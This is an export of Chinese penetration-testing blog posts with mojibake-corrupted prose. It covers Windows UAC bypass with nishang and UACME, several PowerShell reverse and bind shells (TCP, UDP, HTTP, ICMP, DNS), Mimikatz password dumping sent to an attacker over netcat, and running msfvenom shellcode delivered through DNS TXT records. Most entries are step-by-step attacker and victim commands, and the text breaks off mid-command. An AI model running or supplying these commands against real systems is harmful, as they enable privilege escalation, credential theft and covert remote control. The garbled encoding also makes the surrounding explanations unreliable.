    <content type="text"><![CDATA[0x00 ç®€ä»‹UAC(User Account Controlï¼Œç”¨æˆ·å¸æˆ·æ§åˆ¶)æ˜¯å¾®è½¯ä¸ºæé«˜ç³»ç»Ÿå®‰å…¨è€Œåœ¨Windows Vistaä¸­å¼•å…¥çš„æ–°æŠ€æœ¯ï¼Œå®ƒè¦æ±‚ç”¨æˆ·åœ¨æ‰§è¡Œå¯èƒ½ä¼šå½±å“è®¡ç®—æœºè¿è¡Œçš„æ“ä½œæˆ–æ‰§è¡Œæ›´æ”¹å½±å“å…¶ä»–ç”¨æˆ·çš„è®¾ç½®çš„æ“ä½œä¹‹å‰ï¼Œæä¾›æƒé™æˆ–ç®¡ç†å‘˜â€Œå¯†ç ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦ç”¨æˆ·å…è®¸å¯åŠ¨çš„åº”ç”¨ç¨‹åºé€šè¿‡UACéªŒè¯ï¼Œé‚£ä¹ˆè¿™ä¸ªç¨‹åºä¹Ÿå°±æœ‰äº†ç®¡ç†å‘˜æƒé™ã€‚è®¸å¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è·å–äº†åå¼¹çš„shellä½†æ˜¯ç”±äºUACè¿™ä¸ªçƒ¦äººçš„ä¸œè¥¿å¹¶ä¸èƒ½è·å–æœ€é«˜çš„æƒé™ï¼Œä»Šå¤©ä¸»è¦ä»‹ç»ä½¿ç”¨powershellæ¥bypass uacä»è€Œè·å–æ›´é«˜çš„æƒé™ã€‚ 0x01 Bypass UACé€šå¸¸ç»•è¿‡UACçš„æ–¹æ³•å¦‚ä¸‹ï¼š step1: å¤åˆ¶DLLæ–‡ä»¶åˆ°C:\Windows\System32\sysprepç›®å½•ï¼ŒDLLçš„åå­—å–å†³äºæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œæ¯”å¦‚Windows7ä¸ºCRYPTBASE.dllï¼ŒWindows8ä¸ºshcore.dllã€‚ step2ï¼šä»ä¸Šé¢çš„ç›®å½•æ‰§è¡ŒSysprep.exeã€‚ä»–å°†åŠ è½½ä¸Šé¢çš„DLLï¼Œå®Œæˆæƒé™çš„æå‡ã€‚ å…·ä½“dllååŠåˆ©ç”¨exeå¦‚ä¸‹è¡¨ï¼š æ€»ç»“äº†ä¸€ä¸‹çªç ´Windows UACçš„æ–¹å¼ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š 1ã€ä½¿ç”¨IFileOperation COMæ¥å£ï¼› 2ã€ä½¿ç”¨Wusa.exeçš„extracté€‰é¡¹ï¼› 3ã€è¿œç¨‹æ³¨å…¥SHELLCODE åˆ°å‚€å„¡è¿›ç¨‹; 4ã€DLLåŠ«æŒï¼ŒåŠ«æŒç³»ç»Ÿçš„DLLæ–‡ä»¶ï¼› 5ã€ç›´æ¥ææƒè¿‡UAC; 6ã€MS15-076(æ„Ÿè§‰ä¸Šä¹Ÿå¯ä»¥ç”¨åˆ°) POCã€‚ éƒ¨åˆ†æ–¹å¼éœ€è¦æˆ‘ä»¬å°†DLLæ–‡ä»¶æ‹·è´åˆ°ç›¸åº”çš„ç›®å½•ï¼Œè¿™é‡Œæ‹¿Sysprepæ¥åšæµ‹è¯•ï¼Œè¦å¾€è¿™ä¸ªç›®å½•æ‹·è´æ–‡ä»¶éœ€è¦ç®¡ç†å‘˜çš„æƒé™ï¼Œç›´æ¥copyæ˜¯ä¸å¯ä»¥çš„,æœ¬æ–‡ä»‹ç»çš„è„šæœ¬ä½¿ç”¨äº†ç¬¬äºŒç§æ–¹å¼ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæµ‹è¯•ã€‚ä½¿ç”¨copy:1C:\UAC&gt;copy evil.dll C:\Windows\System32\sysprep\ ä½¿ç”¨Wusa.exeï¼š12C:\&gt; makecab C:\uac\evil.dll C:\uac\uac.cabC:\&gt; wusa C:\uac\uac.cab /extract:C:\Windows\System32\sysprep\ å¯ä»¥çœ‹åˆ°ä½¿ç”¨wusaæˆåŠŸæ‹·è´ã€‚ 0x02 Invoke-PsUACmeInvoke-PsUACme æ˜¯nishangçš„ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬ä½¿ç”¨äº†åˆ—è¡¨ä¸­çš„å‡ ä¸ªæ–¹å¼æ¥è¿›è¡Œbypass UACï¼Œç›®å‰æ”¯æŒWin7 ï¼ŒWin8,ç”±äºWin10çš„wusa extracté€‰é¡¹ä¸åœ¨å—æ”¯æŒï¼Œæ‰€ä»¥æ­¤è„šæœ¬å¹¶ä¸é€‚ç”¨äºWin10ã€‚è¯¥è„šæœ¬çš„æ‰€ä½¿ç”¨çš„DLLæ¥è‡ªäºå¼€æºé¡¹ç›®UACMEã€‚nishangä½œè€…å¯¹ä»£ç è¿›è¡Œäº†ä¸€ä¸‹ç®€å•åœ°ä¿®æ”¹ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è¯´äº†ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹è„šæœ¬çš„ä½¿ç”¨,åŠ è½½è„šæœ¬ï¼š1PS C:\UAC&gt; . .\Invoke-PsUACme.ps1 æŸ¥çœ‹è¯´æ˜ï¼š1PS C:\UAC&gt; help Invoke-PsUACme ä¸»è¦å‚æ•°è¯´æ˜ï¼šPayloadä¸ºè‡ªå®šä¹‰è¦æ‰§è¡Œçš„ç¨‹åºï¼›methodä¸ºbypassçš„æ–¹å¼ï¼ŒåŒ…æ‹¬Sysprepï¼ŒOOBEï¼ŒActionQueueç­‰å‡ ç§ï¼›Verboseæ˜¾ç¤ºç¨‹åºè¿è¡Œè¿‡ç¨‹ï¼›CustomDLL64,CustomDLL32å¯ä»¥æŒ‡å®šè‡ªå®šä¹‰DLLã€‚ æ‰§è¡Œï¼š1PS C:\UAC&gt; Invoke-PsUACme -Verbose ä½¿ç”¨Sysprepæ‰§è¡Œpayload:1PS C:\UAC&gt; Invoke-PsUACme -method sysprep -Payload "cmd.exe" æ‰§è¡ŒæŸä¸ªè‡ªå®šä¹‰ç¨‹åºéœ€è¦åœ¨payloadå‡ºå¡«å†™ç»å¯¹è·¯å¾„ã€‚ è‡ªå®šä¹‰DLLï¼š1PS C:\&gt; Invoke-PSUACMe -CustomDll64 C:\test\test64.dll -CustomDll32 C:\test\test32.dll -Verbose" 0x03 èƒ½åšä»€ä¹ˆ1ï¼‰é€šè¿‡bypass UACæˆ‘ä»¬å¯ä»¥é€šè¿‡æ™®é€šçš„cmdæŠ“åˆ°ç®¡ç†å‘˜å¯†ç ã€‚æ™®é€šcmdè¿è¡Œåœ¨çº¿æŠ“æ˜æ–‡ï¼š1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz bypass UACä»¥åï¼š12PS C:\UAC&gt; . .\Invoke-PsUACme.ps1PS C:\UAC&gt; Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz" 2) è®©meterpreterè·å¾—æ›´é«˜çš„æƒé™ã€‚ç”Ÿæˆpayload:1â˜ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection å°†è¾“å‡ºæ–‡ä»¶ä¿å­˜ä¸ºpsh.ps1 msfå¼€å¯ç›‘å¬ï¼š12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost x.x.x.xlhost =&gt; x.x.x.xmsf exploit(handler) &gt; set lport 8889lport =&gt; 8889msf exploit(handler) &gt; exploit æ™®é€šcmdæ‰§è¡Œ: bypass UAC ä»¥åæ‰§è¡Œï¼š 0x04 Win10 Bypass UACæˆ‘ä¿®æ”¹äº†ä¸€ä¸ªä½¿ç”¨è¿œç¨‹æ³¨å…¥æ–¹å¼Bypass UACçš„powersellè„šæœ¬ä»¥æ”¯æŒWin10,è„šæœ¬åœ°å€ï¼šæˆ³æˆ‘ ä½¿ç”¨æ–¹å¼ä¸nishangä¸åŒï¼Œå¹¶æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨win10è¿›è¡Œæµ‹è¯•ï¼š12PS F:\drops\UAC&gt; . .\invoke-BypassUAC.ps1PS F:\drops\UAC&gt; invoke-BypassUAC -Command 'net user 1 "Password123!" /add' é™¤äº†ä¸Šé¢çš„è„šæœ¬ï¼ŒUACMEä¹Ÿå¾ˆå¥½çš„æ”¯æŒwin10,ä½¿ç”¨æ–¹å¼ä¸ºï¼š1234akagi32.exe 1akagi64.exe 3akagi32 1 c:\windows\system32\calc.exeakagi64 3 c:\windows\system32\cmd.exe 0x05 å°ç»“ç»•è¿‡UACèƒ½è·å–æ›´é«˜çš„æƒé™ï¼Œä½ è¿˜å‘æ„æŠ“å¯†ç ä¹ˆï¼Ÿ]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>uac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nishangä¹‹èŠ±æ ·shell]]></title>
    <url>%2Farchives%2FNishang_shells.html</url>
    <content type="text"><![CDATA[nishangä¹‹èŠ±æ ·shell 0x00 ç®€ä»‹Nishangæ˜¯åŸºäºPowerShellçš„æ¸—é€æµ‹è¯•ä¸“ç”¨å·¥å…·ã€‚é›†æˆäº†æ¡†æ¶ã€è„šæœ¬å’Œå„ç§payloadã€‚æœ¬ç¯‡ä¸»è¦ä»‹ç»nishangä¸­çš„å„ç§shellã€‚ä¸»è¦é’ˆå¯¹é¢„è£…æœ‰powershellçš„ç³»ç»Ÿã€‚ 0x01 TCP shell1.Reverse shellAttackeræ‰§è¡Œ:12root@kali:~# nc -lvp 4444listening on [any] 4444 .. Victimæ‰§è¡Œ:12PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444 192.168.52.129 ä¸ºAttacker IPåœ°å€ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š æ•°æ®æŠ¥æ–‡å¦‚ä¸‹ï¼š ä»æŠ¥æ–‡å¯ä»¥çœ‹å‡ºæ‰€æœ‰æ•°æ®é€šè¿‡TCPä¼ è¾“ï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠè¿”å›çš„ç»“æœå‡åœ¨æŠ¥æ–‡ä¸­å¯è§ã€‚ 2.Bind shellVictim æ‰§è¡Œï¼š12PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888 Attacker æ‰§è¡Œï¼š12PS F:\Shells&gt; . .\powercat.ps1PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888 192.168.52.1 ä¸ºVictim IPåœ°å€ã€‚ ç»“æœå¦‚ä¸‹ï¼š 0x02 UDP Shell1.Reverse shellAttackeræ‰§è¡Œ:12root@kali:~# nc -lvup 53listening on [any] 53 ... Victimæ‰§è¡Œ:12PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53 192.168.52.129 ä¸ºAttacker IPåœ°å€ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š æ•°æ®æŠ¥æ–‡å¦‚ä¸‹ï¼š ä»æŠ¥æ–‡å¯ä»¥çœ‹å‡ºæ‰€æœ‰æ•°æ®é€šè¿‡UDPä¼ è¾“ï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠè¿”å›çš„ç»“æœå‡åœ¨æŠ¥æ–‡ä¸­å¯è§ã€‚ å¹¶ä¸”è¿™ç§æ–¹å¼æ”¯æŒIPV6ï¼Œå¦‚ä¸‹å›¾ï¼š 2.Bind shellVictimæ‰§è¡Œ:12PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777 Attackeræ‰§è¡Œ:1root@kali:~# nc -vtu 192.168.52.1 7777 192.168.52.1 ä¸ºVictim IPåœ°å€ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š 0x03 HTTP/HTTPS shell è¿™é‡Œè¦è¯´æ˜ä¸€ä¸‹Invoke-PoshRatHttp/Invoke-PoshRatHttps éœ€è¦Attackerä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ 1. HTTPAttackeræ‰§è¡Œ: 123PS F:\Shells&gt; . .\Invoke-PoshRatHttp.ps1PS F:\Shells&gt; Invoke-PoshRatHttp -IPAddress 192.168.52.1 -Port 80Listening on 80 Victimæ‰§è¡Œ:1PS C:\Users\evi1cg&gt; iex (New-Object Net.WebClient).DownloadString("http://192.168.52.1/connect") 192.168.52.1 ä¸ºAttacker IPåœ°å€ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š æ•°æ®åŒ…å¦‚ä¸‹ï¼š ä»æŠ¥æ–‡å¯ä»¥çœ‹å‡ºæ‰€æœ‰æ•°æ®é€šè¿‡HTTPä¼ è¾“ï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠè¿”å›çš„ç»“æœå‡åœ¨æŠ¥æ–‡ä¸­å¯è§ã€‚ 2. HTTPSç¬”è€…æµ‹è¯•ä½¿ç”¨nishangä½œè€…æœ€æ–°çš„è„šæœ¬å‡ºç°é”™è¯¯å¦‚ä¸‹ï¼šAttackeræ‰§è¡Œ: 1234PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 8443Listening on 84436D559E5925FBCC8BE5FB3257F503CB8A6C5791A7 Victimæ‰§è¡Œ:1PS C:\Users\evi1cg&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;;iex (New-Object Net.WebClient).DownloadString("https://192.168.52.1:8443/connect") æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š æ‰¾åˆ°å†å²ç‰ˆæœ¬ä¸­çš„æ–‡ä»¶è¿›è¡Œæµ‹è¯•æˆåŠŸï¼ŒInvoke-PoshRatHttps.ps1Attackeræ‰§è¡Œ: 12PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443 è¿™é‡Œå¦‚æœå‡ºç°â€œå¦ä¸€ä¸ªç¨‹åºæ­£åœ¨ä½¿ç”¨æ­¤æ–‡ä»¶ï¼Œè¿›ç¨‹æ— æ³•è®¿é—®çš„é”™è¯¯æ—¶ï¼Œå¯ä»¥æ›´æ¢SSLPortç«¯å£ Victimæ‰§è¡Œ(è¿™é‡Œå—å®³è€…è¯·æ±‚çš„æ˜¯HTTP): 1PS C:\Users\evi1cg&gt; iex (New-Object Net.WebClient).DownloadString("http://192.168.52.1/connect") 192.168.52.1 ä¸ºAttacker IPåœ°å€ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š æ•°æ®æŠ¥æ–‡å¦‚ä¸‹ï¼š é€šè¿‡æŠ¥æ–‡å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†æœ€åˆçš„è¿æ¥è¯·æ±‚æ˜¯é€šè¿‡HTTPä¼ è¾“ï¼Œå…¶ä»–çš„ä¸€åˆ‡æ•°æ®éƒ½æ˜¯é€šè¿‡HTTPSè¿æ¥è¿›è¡Œé€šä¿¡ï¼Œæ‰§è¡Œçš„å‘½ä»¤åŠè¿”å›çš„ç»“æœåœ¨æŠ¥æ–‡ä¸­ä¸å¯è§ã€‚ 0x04 ICMP shellè¿™é‡Œéœ€è¦ä¸€ä¸ªè„šæœ¬icmpsh,Attackeræ‰§è¡Œ:123â˜ icmpsh [master] sysctl -w net.ipv4.icmp_echo_ignore_all=1 #å¿½ç•¥æ‰€æœ‰icmpåŒ…æˆ–è€…pingnet.ipv4.icmp_echo_ignore_all = 1â˜ icmpsh [master] python icmpsh_m.py 192.168.52.131 192.168.52.1 python icmpsh_m.py (Attackerâ€™s IP) (Victims IP) Victimæ‰§è¡Œ: 12PS F:\Shells&gt; . .\Invoke-PowerShellIcmp.ps1PS F:\Shells&gt; Invoke-PowerShellIcmp -IPAddress 192.168.52.131 æ‰§è¡Œç»“æœï¼š æ•°æ®æŠ¥æ–‡å¦‚ä¸‹ï¼š ä»æŠ¥æ–‡å¯ä»¥çœ‹å‡ºæ‰€æœ‰æ•°æ®é€šè¿‡ICMPä¼ è¾“ï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠè¿”å›çš„ç»“æœå‡åœ¨æŠ¥æ–‡ä¸­å¯è§ã€‚ 0x05 DNS shellæ­¤æ¬¡ç¤ºä¾‹éœ€è¦dnscat2ä»¥åŠpowercat ã€‚å®‰è£…å®Œdnscat2åã€‚Attackeræ‰§è¡Œ:1â˜ server [master] âš¡ ruby dnscat2.rb shellcome.com Victimæ‰§è¡Œ: 12PS F:\Shells&gt; . .\powercat.ps1PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep 192.168.52.131 ä¸ºAttacker IPåœ°å€ï¼Œå³shellcome.comåº”è¯¥è§£æçš„IPåœ°å€ã€‚ æ‰§è¡Œæ•ˆæœ: æ•°æ®æŠ¥æ–‡å¦‚ä¸‹ï¼š é€šè¿‡æŠ¥æ–‡å¯ä»¥çœ‹å‡ºæ‰€æœ‰æ•°æ®é€šè¿‡DNSä¼ è¾“ï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠè¿”å›çš„ç»“æœå‡åœ¨æŠ¥æ–‡ä¸­ä¸å¯è§ã€‚ 0x06 å°ç»“ é€šè¿‡ä»¥ä¸Šæµ‹è¯•ï¼Œå¯ä»¥çœ‹å‡ºHTTPSä»¥åŠDNSæ–¹å¼çš„shellæ›´ä¸ºéšè”½ã€‚å¦‚æœæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸ªå¼¹ä¸å‡ºshellï¼Œé‚£å°±æ¢ä¸ªå§¿åŠ¿å§~]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>nishang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MAC tips]]></title>
    <url>%2Farchives%2FMAC.html</url>
    <content type="text"><![CDATA[1.æ›´æ–°loacteåº“1sudo /usr/libexec/locate.updatedb 2.macportè·Ÿhomebrewä¸å…¼å®¹ã€‚å¸è½½macportï¼š12345678910111213sudo port -f uninstall installedsudo port clean allsudo rm -rf \/opt/local \/Applications/DarwinPorts \/Applications/MacPorts \/Library/LaunchDaemons/org.macports.* \/Library/Receipts/DarwinPorts*.pkg \/Library/Receipts/MacPorts*.pkg \/Library/StartupItems/DarwinPortsStartup \/Library/Tcl/darwinports1.0 \/Library/Tcl/macports1.0 \~/.macports 3.å¼€å¯è½¬å‘ï¼š1sysctl -w net.inet.ip.forwarding=1]]></content>
      <categories>
        <category>éšä¾¿å†™å†™</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz ä½¿ç”¨Tips]]></title>
    <url>%2Farchives%2FTips_of_Mimikatz.html</url>
    <content type="text"><![CDATA[Mimikatz ä½¿ç”¨Tips1.è®°å½• Mimikatzè¾“å‡ºï¼š1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit &amp;&amp; dir 2.å°†è¾“å‡ºå¯¼å…¥åˆ°æœ¬åœ°æ–‡ä»¶ï¼š1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit &gt;&gt; log.txt 3.å°†è¾“å‡ºä¼ è¾“åˆ°è¿œç¨‹æœºå™¨ï¼šAttackeræ‰§è¡Œ:1E:\&gt;nc -lvp 4444 Victimæ‰§è¡Œ:1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.52.1 4444 192.168.52.1 ä¸ºAttacker IP 4.é€šè¿‡ncè¿œç¨‹æ‰§è¡ŒMimikatzï¼šVictimæ‰§è¡Œ:1C:\&gt;nc -lvp 443 Attackeræ‰§è¡Œ:1E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe 192.168.52.128 ä¸ºVictim IP 5.hashä¼ é€’12Privilege::debugsekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx ä¹‹åä¼šå¼¹å‡ºcmdã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡DNS TXTè®°å½•æ‰§è¡Œpowershell]]></title>
    <url>%2Farchives%2FExecPowershell_Use_DNSTXT.html</url>
    <content type="text"><![CDATA[é€šè¿‡DNS TXTè®°å½•æ‰§è¡Œpowershell0x00ç®€ä»‹ DNS TXTè®°å½•ä¸€èˆ¬ç”¨æ¥è®°å½•æŸä¸ªä¸»æœºåæˆ–è€…åŸŸåè®¾ç½®çš„è¯´æ˜ï¼Œåœ¨è¿™é‡Œå¯ä»¥å¡«å†™ä»»ä½•ä¸œè¥¿ï¼Œé•¿åº¦é™åˆ¶255ã€‚ç»å¤§å¤šæ•°çš„TXTè®°å½•æ˜¯ç”¨æ¥åšSPFè®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨nishangé€šè¿‡åˆ›å»ºTXTè®°å½•æ‰§è¡Œpowershellè„šæœ¬ã€‚å½“ç„¶ï¼Œé¦–å…ˆä½ è¦æœ‰ä¸€ä¸ªåŸŸåã€‚ 0x01åˆ›å»ºTXTè®°å½• è¿™é‡Œéœ€è¦ä½¿ç”¨nishangä¸­çš„ä¸€ä¸ªè„šæœ¬OUT-DnsTxtã€‚ 1.å¸¸è§å‘½ä»¤å› ä¸ºå¸¸è§å‘½ä»¤æ¯”è¾ƒçŸ­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ·»åŠ åˆ°TXTè®°å½•ä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š ç°åœ¨æŸ¥çœ‹ä¸€ä¸‹TXTè®°å½•ï¼š å¯ä»¥çœ‹åˆ°è®°å½•å·²ç»æˆåŠŸæ·»åŠ äº†ã€‚ 2.è„šæœ¬ç”±äºTXTè®°å½•é•¿åº¦é™åˆ¶ä¸º255,å¦‚æœè¦æ·»åŠ ä¸€ä¸ªè„šæœ¬åˆ°è®°å½•é‡Œé¢ï¼Œéœ€è¦æ·»åŠ å¤šä¸ªTXTè®°å½•ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­,è‡ªå·±å†™äº†ä¸€ä¸ªPSHè„šæœ¬ï¼š123456789101112131415function Get-User&#123;&lt;#.SYNOPSISScript to generate DNS TXT for a test..DESCRIPTIONUse this script to get user information. to be more big.. more big... big..Do one thing at a time, and do well.Keep on going never give up..EXAMPLEPS &gt; Get-User#&gt;[CmdletBinding()]Param () net user&#125; ä½¿ç”¨Out-Dnstxtè¿›è¡Œè½¬æ¢ï¼š1234PS F:\DNS&gt; . .\Out-DnsTxt.ps1PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\Get-User.ps1You need to create 2 TXT records.All TXT Records written to F:\DNS\encodedtxt.txt ç”±äºè¿™ä¸ªè„šæœ¬æ¯”è¾ƒå°ï¼Œæ‰€ä»¥åªç”Ÿäº§ä¸¤è¡Œï¼š å¯ä»¥åˆ†åˆ«å°†è¿™ä¸¤è¡Œå†…å®¹æŒ‰é¡ºåºæ·»åŠ åˆ° 1.ps.domain.comåˆ°2.ps.domian.comä¸­å¦‚ä¸‹å›¾ï¼š æŸ¥çœ‹TXTï¼Œå¯ä»¥çœ‹åˆ°å†…å®¹éƒ½å·²ç»æ·»åŠ å¥½äº†ï¼š 0x02 æ‰§è¡ŒPowershell æ·»åŠ å®Œäº†TXTè®°å½•ä»¥åï¼Œé€šè¿‡DNS_TXT_Pwnage.ps1æ¥æ‰§è¡Œè¿™äº›è„šæœ¬ã€‚ DNS_TXT_Pwnage.ps1 æ˜¯ä¸€ä¸ªé€šè¿‡DNS TXTæ¥æ¥æ”¶å‘½ä»¤æˆ–è€…è„šæœ¬çš„ä¸€ä¸ªåé—¨è„šæœ¬ è¿™é‡Œè¿˜éœ€è¦æ·»åŠ ä¸¤æ¡è®°å½•ï¼Œstratä¸stopï¼Œå…·ä½“å¦‚ä¸‹å›¾ï¼š 1.æ‰§è¡Œå‘½ä»¤123PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring start -commanddomain command.evi1cg.me -psstring test -psdomain xxx.evi1cg.me -Subdomains 1 -StopString stop è§£é‡Šä¸€ä¸‹å‚æ•°ï¼š startdomainä¸ºåˆ›å»ºçš„start.domainï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼› cmdstring ä¸ºä»»æ„è¾“å…¥çš„å­—ç¬¦ä¸²ï¼› commanddomainä¸ºåˆ›å»ºçš„æ‰§è¡Œå‘½ä»¤TXTè®°å½•çš„åŸŸåï¼› psstringä¸ºä»»æ„è¾“å…¥çš„å­—ç¬¦ä¸²ï¼› psdomainä¸ºåˆ›å»ºçš„æ‰§è¡Œè„šæœ¬TXTè®°å½•çš„åŸŸåæˆ–å­åŸŸå ï¼› Subdomainsä¸ºæ‰§è¡Œè„šæœ¬åˆ›å»ºTXTè®°å½•çš„ä¸ªæ•°ï¼ˆå¦‚1.2ä¸­åˆ›å»ºçš„è„šæœ¬ï¼Œè¯¥å€¼ä¸º2ï¼‰ï¼› StopStringä¸ºä»»æ„è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚ æ­¤å¤„æ¯”è¾ƒé‡è¦çš„å‚æ•°ä¸ºstartdomainï¼Œä»–ä¼šä¸æˆ‘ä»¬è¾“å…¥çš„cmdstringä»¥åŠpsstringè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸cmdstringå€¼ç›¸ç­‰ï¼Œåˆ™æ‰§è¡Œcommanddomain å³å‘½ä»¤ï¼Œä¸psstringç›¸ç­‰åˆ™æ‰§è¡Œpsdomainå³è„šæœ¬ã€‚ ä¸Šé¢ä¸ºæ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥cmdstringå€¼æˆ‘ä»¬è¾“å…¥ä¸ºstartï¼Œä¸start.evi1cg.meçš„txtè®°å½•å€¼ç›¸ç­‰ï¼Œpsstringéšä¾¿è¾“å…¥ï¼Œä¸ç•™ç©ºå°±è¡Œã€‚æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾ï¼š æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹command.domainçš„TXTå€¼æ¥æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚æ¯”å¦‚Get-Hostï¼š 2.æ‰§è¡Œè„šæœ¬123PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring bulabula -commanddomain command.evi1cg.me -psstring start -psdomain ps.evi1cg.me -Arguments Get-User -Subdomains 2 -StopString stop è¿™é‡Œè¦æ³¨æ„ï¼Œpsstringçš„å€¼ä¸ºstartï¼Œä¸start.domainçš„TXTè®°å½•ç›¸åŒï¼Œcmdstringä¸ºä»»æ„å­—ç¬¦ä¸²ã€‚æ•ˆæœå¦‚ä¸‹å›¾ï¼š è¿™é‡Œå¤šä¸€ä¸ªå‚æ•°Argumentsï¼Œè¦å†™æ˜è¦æ‰§è¡Œçš„å‡½æ•°åï¼Œæµ‹è¯•å‘ç°ï¼Œåœ¨è„šæœ¬ä¸­å«æœ‰ä¸­æ–‡æ—¶ä¼šå¤±è´¥ã€‚å¯¹äºéœ€è¦å¸¦å‚æ•°çš„è„šæœ¬å¯ä»¥ä¿®æ”¹è„šæœ¬æŒ‡å®šå‚æ•°å€¼ã€‚ 0x03 æ‰§è¡ŒShellcode å¯ä»¥é€šè¿‡TXTè®°å½•æ‰§è¡Œshellcodeï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªpowershellçš„shellcode:1â˜ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp -f powershell LHOST=x.x.x.x LPORT=8887 &gt; pspayload.txt ä½¿ç”¨Out-DnsTxtå¯¹ç”Ÿæˆçš„æ–‡ä»¶è¿›è¡Œè½¬æ¢ï¼š123PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\pspayload.txtYou need to create 3 TXT records.All TXT Records written to F:\DNS\encodedtxt.txt ç„¶åå°†ä»¥ä¸Šè®°å½•åˆ†åˆ«æ·»åŠ åˆ°TXTè®°å½•ä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š æµ‹è¯•ä½¿ç”¨çš„32ä½win7ç³»ç»Ÿï¼Œä½¿ç”¨msfå¼€å¯ç›‘å¬ï¼š1234567891011msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LPORT 8887LPORT =&gt; 8887msf exploit(handler) &gt; set 